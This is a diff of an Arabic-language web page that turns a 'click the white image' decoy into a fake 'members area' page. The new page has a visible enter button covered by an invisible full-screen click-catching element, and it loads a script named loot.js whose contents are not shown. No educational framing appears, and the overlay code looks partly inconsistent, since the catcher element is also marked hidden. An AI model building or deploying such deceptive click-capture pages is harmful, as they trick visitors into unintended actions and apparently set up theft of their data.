@@ -2,14 +2,16 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="utf-8">
-  <title>مجرد صورة</title>
+  <title>منطقة الأعضاء</title>
   <style>
-    #jinni{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:1px;height:1px;opacity:0;cursor:pointer;z-index:9999}
+    html,body{margin:0;height:100%;background:#f3f3f3;display:flex;align-items:center;justify-content:center}
+    button{padding:12px 28px;font-size:18px;border:none;border-radius:6px;background:#1d9bf0;color:#fff;cursor:pointer}
+    #ghost{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer;z-index:9999}
   </style>
 </head>
 <body>
-  <h1 style="text-align:center">اضغط على الصورة البيضاء</h1>
-  <img id="jinni" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==">
+  <label for="ghost"><button>دخول</button></label>
+  <input id="ghost" type="checkbox" hidden>
   <script src="loot.js"></script>
 </body>
 </html>
